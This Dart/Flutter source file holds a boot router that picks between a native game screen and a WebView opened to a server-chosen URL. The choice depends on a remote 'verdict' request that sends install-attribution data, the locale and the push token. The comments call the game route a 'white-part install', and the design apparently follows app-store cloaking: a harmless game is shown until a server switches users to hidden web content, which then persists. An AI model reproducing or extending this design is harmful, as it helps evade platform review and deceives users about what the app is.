import 'dart:async';
import 'dart:io';

import 'brief/spec.dart';
import 'dock/outcome.dart';
import 'lines/alerts.dart';
import 'lines/install_trace.dart';
import 'lines/vault.dart';
import 'lines/push_tap.dart';
import 'lines/reach.dart';
import 'lines/gate_ask.dart';

// ============================================================
// CALDERA ROUTER — single entry point for the boot decision
// ============================================================
// One method: `decide(onProgress)` returns a `Docking` sealed
// type. The boot screen destructures via `switch (landing)` and
// only there decides which route to push. No routing logic lives
// anywhere else in the codebase.
//
// The decision pipeline branches on the persisted [TrailMark]:
//
// Reachability is settled BEFORE anything else on the two routes
// that need the network — first launch and every portal launch — so
// a dead connection shows the offline stage on frame one instead of
// after a full progress bar. The native route never probes: a
// returning white-part install must open offline.
//
//   undecided (first launch)
//     ├─ unreachable       → GapDock(returnsToGame: false)
//     ├─ verdict approved  → save portal → ViewDock(url)
//     └─ verdict rejected  → save native → NativeDock
//
//   portal (was in the WebView)
//     ├─ unreachable       → GapDock(returnsToGame: false)
//     ├─ cold-tap URL      → ViewDock(url, coldTap: true)
//     ├─ fresh cached URL  → ViewDock(cachedUrl)
//     ├─ verdict approved  → ViewDock(freshUrl)
//     ├─ verdict rejected but cache exists
//     │                    → ViewDock(cachedUrl)  (last-known-good)
//     └─ otherwise         → GapDock(returnsToGame: false)
//
//   native (was in the game — never probed, opens offline)
//     ├─ cold-tap URL      → treated as a portal launch
//     ├─ no adapter        → NativeDock                (never blocks)
//     ├─ verdict approved  → save portal → ViewDock(url)
//     └─ verdict rejected  → NativeDock
//
// Concurrent boots are de-duplicated — the coordinator caches the
// in-flight future so two synchronous `decide()` calls (e.g. the
// boot screen briefly building twice) do not fire two verdict
// POSTs. The cache clears on completion so a Retry from the
// offline stage re-runs the pipeline in full.
// ============================================================

class RelayCoordinator {
  RelayCoordinator({
    required this.keystore,
    required this.probe,
    required this.pulse,
    required this.verdict,
    required this.alerts,
  });

  final BeaconKeystore keystore;
  final PulseProbe probe;
  final InstallTrace pulse;
  final GateAsk verdict;
  final AlertChannel alerts;

  Future<Docking>? _inFlight;

  Future<Docking> decide({void Function(double)? onProgress}) {
    return _inFlight ??= _decide(onProgress ?? (_) {})
        .whenComplete(() => _inFlight = null);
  }

  Future<Docking> _decide(void Function(double) onProgress) async {
    if (!RelayConfig.credentialsReady) {
      onProgress(1);
      return const NativeDock();
    }

    alerts.onTokenChanged = _refreshOnTokenChange;

    final TrailMark route = keystore.route;

    // A returning white-part install owns everything it needs on disk,
    // so it must open with no connection at all — and must not wait
    // on Firebase either.
    if (route == TrailMark.native) {
      onProgress(0.15);
      return _decideReturningGame(onProgress);
    }

    // Probe BEFORE reading a cold-tap intent. `getInitialMessage()`
    // can sit on a dead network until `pushLaunchAwaitSeconds`, which
    // is long enough for the loading screen to paint a full bar and
    // look like the app is ready. A push URL is useless offline
    // anyway; Retry after the user reconnects re-reads the intent.
    if (!await probe.hasAdapter() || !await probe.canDialOut()) {
      return const GapDock(returnsToGame: false);
    }

    final String? coldTapUrl = await InlineBeacon.consume(alerts);
    if (coldTapUrl != null && coldTapUrl.isNotEmpty) {
      await keystore.saveRoute(TrailMark.portal);
      unawaited(_fireAndForget());
      onProgress(1);
      return ViewDock(coldTapUrl, coldTap: true);
    }
    // Drop leftover pending URLs from older builds that persisted
    // a tap across launches — those must not hijack this session.
    await keystore.stashPendingUrl(null);

    onProgress(0.15);
    return switch (route) {
      TrailMark.portal => _decideReturningPortal(onProgress),
      TrailMark.undecided || TrailMark.native =>
        _decideFirstLaunch(onProgress),
    };
  }

  Future<Docking> _decideFirstLaunch(void Function(double) onProgress) async {
    onProgress(0.3);
    try {
      await alerts.boot();
    } catch (_) {}
    onProgress(0.5);
    await pulse.start();
    await pulse.awaitSignals(
      installSeconds: RelayConfig.firstInstallAwaitSeconds,
    );
    onProgress(0.75);
    final GateReply answer = await _requestVerdict();
    onProgress(1);
    if (answer.hasDestination) {
      await keystore.saveRoute(TrailMark.portal);
      return ViewDock(answer.url!);
    }
    await keystore.saveRoute(TrailMark.native);
    return const NativeDock();
  }

  Future<Docking> _decideReturningPortal(
    void Function(double) onProgress,
  ) async {
    final String? pending = await keystore.consumePendingUrl();
    if (pending != null && pending.isNotEmpty) {
      onProgress(1);
      return ViewDock(pending);
    }
    final String? cached = await keystore.cachedDestination();
    if (cached != null && !keystore.cachedDestinationExpired) {
      onProgress(1);
      return ViewDock(cached);
    }

    await Future.wait<void>(<Future<void>>[
      alerts.boot(),
      pulse.start(),
    ]);
    onProgress(0.6);
    await pulse.awaitSignals(
      installSeconds: RelayConfig.returningInstallAwaitSeconds,
    );
    final GateReply answer = await _requestVerdict();
    onProgress(1);
    if (answer.hasDestination) return ViewDock(answer.url!);
    if (cached != null) return ViewDock(cached);
    return const GapDock(returnsToGame: false);
  }

  Future<Docking> _decideReturningGame(
    void Function(double) onProgress,
  ) async {
    if (!await probe.hasAdapter()) {
      onProgress(1);
      return const NativeDock();
    }
    await Future.wait<void>(<Future<void>>[
      alerts.boot(),
      pulse.start(),
    ]);
    if (!await probe.canDialOut()) {
      onProgress(1);
      return const NativeDock();
    }
    onProgress(0.55);
    await pulse.awaitSignals(
      installSeconds: RelayConfig.returningInstallAwaitSeconds,
    );
    final GateReply answer = await _requestVerdict();
    onProgress(1);
    if (!answer.hasDestination) return const NativeDock();
    await keystore.saveRoute(TrailMark.portal);
    return ViewDock(answer.url!);
  }

  Future<GateReply> _requestVerdict({String? token}) async {
    final Map<String, dynamic> body = await pulse.compose(
      locale: Platform.localeName.replaceAll('-', '_'),
      pushToken: token ?? alerts.token,
    );
    return verdict.ask(body);
  }

  Future<void> _fireAndForget() async {
    try {
      await Future.wait<void>(<Future<void>>[
        alerts.boot(),
        pulse.start(),
      ]);
      await pulse.awaitSignals(
        installSeconds: RelayConfig.returningInstallAwaitSeconds,
      );
      await _requestVerdict();
    } catch (_) {}
  }

  Future<void> _refreshOnTokenChange(String token) async {
    try {
      await _requestVerdict(token: token);
    } catch (_) {}
  }
}
